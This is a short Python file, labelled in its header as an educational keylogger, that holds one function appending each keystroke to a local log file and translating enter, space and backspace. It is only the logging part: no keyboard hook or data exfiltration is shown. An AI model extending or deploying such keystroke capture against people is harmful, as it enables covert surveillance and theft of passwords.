# This script is a keylogger for educational purposes only.
# Author: adrihamel

'''
Function to store with translations each of the keyboard input events
'''

def saveInFile(key):
    f = open('keylog.txt', 'a')
    key=str(key)
    if key == 'Key.enter':
        f.write('\n')
    elif key == 'Key.space':
        f.write(' ')
    elif key == 'Key.backspace':
        f.write('%BORRAR%')
    else:
        f.write(key.replace("'",""))
    f.close()
